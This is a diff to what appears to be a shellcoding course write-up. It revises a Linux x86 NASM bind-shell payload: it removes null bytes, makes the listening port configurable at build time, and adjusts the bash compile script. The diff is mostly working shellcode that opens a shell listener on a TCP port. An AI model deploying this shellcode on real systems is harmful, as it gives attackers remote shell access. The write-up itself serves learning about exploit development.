@@ -244,7 +244,8 @@ int 0x80 		; Execute SHELL
 
 The final code snippet was modified after having found null bytes in the disassembly. 
 I resolved this by chaning all the mov instructions from the 32 bit register to the 
-lower 16 bits eg. eax > ax or the lower 8 bits al.
+lower 16 bits eg. eax > ax or the lower 8 bits al. Also added is `LISTEN_PORT` which 
+allows port customization at build time.
 
 ```nasm
 ; shell_bind_tcp.nasm
@@ -264,16 +265,16 @@ _start:         ;
         mov ax, 0x167   ; socket syscall
         mov bl, 2       ; socket_family=AF_INET (0x2)
         mov cl, 1       ; socket_type=SOCK_STREAM (0x1)
-        mov dl, 0       ; protocol=IPPROTO_IO (0x0) [edx was already 0]
+        	        ; protocol=IPPROTO_IO (0x0) [edx was already 0]
         int 0x80        ; interrupt
 
         ;bind
         mov esi, eax     ; store sockfd in esi for later use
         push esi         ; store sockfd on stack
-        mov ax, 0x169   ; bind syscall
+        mov ax, 0x169    ; bind syscall
         pop ebx          ; pop sockfd off stack into ebx
         push edi         ; push 0x00000000 (0.0.0.0) / sin.addr [last arg] to stack
-        push word 0x5c11 ; push port 1337 to stack / sin_port
+        push word LISTEN_PORT ; push custom port to stack / sin_port
         push word 0x0002 ; push AF_INET/IPV4 [2] to stack / sin_family
         mov ecx, esp     ; mov pointer of stack to ecx
         mov dl, 0x10     ; mov 16 bit address length to edx
@@ -321,7 +322,7 @@ To do this, I learned that rather than hardcoding a port, you can enter a placeh
 what that placeholder should be at build time.
 
 Rather than doing a `push word 0x5c11` you can do `push word LISTEN_PORT`.
-When compiling, feeding nasm the `-DLISTEN_PORT=PORT` will allw us to specify a port at build time. 
+When compiling, feeding nasm the `-DLISTEN_PORT=PORT` will allow us to specify a port at build time. 
 I have modified Vivek's script slightly to compile a 32bit elf on a 64bit linux machine.
 
 The script will take the basename of the nasm file as the first argument and the port
@@ -330,7 +331,8 @@ as the second arguement: `./compile.sh bind_shell 4444`.
 #!/bin/bash
 
 echo '[+] Assembling with Nasm ... '
-nasm -f elf32 -DLISTEN_PORT=$2 -o $1.o $1.nasm
+port=$(python -c "import socket; print(socket.htons($2))")
+nasm -f elf32 -o $1.o -DLISTEN_PORT=$port $1.nasm
 
 echo '[+] Linking ...'
 #ld -z execstack -o $1 $1.o
